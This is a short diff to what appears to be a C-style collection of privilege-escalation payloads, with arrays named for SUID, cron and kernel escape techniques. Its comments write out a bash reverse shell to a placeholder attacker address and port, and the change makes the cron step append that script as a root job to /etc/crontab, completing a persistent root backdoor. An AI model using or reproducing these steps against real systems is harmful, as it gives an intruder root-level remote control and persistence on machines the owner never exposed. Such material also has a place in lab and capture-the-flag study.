@@ -44,7 +44,7 @@ uint8_t suidEsc[100] {
 uint8_t cronEsc[100] {
     // cd /home
     // echo "bash -i >& /dev/tcp/ATTACKER_IP_ADDRESS/PORT" > cron.sh
-    // echo "* * * * * root /home/cron.sh"
+    // echo "* * * * * root /home/cron.sh" >> /etc/crontab
 }
 
 uint8_t kernelExp[100] {
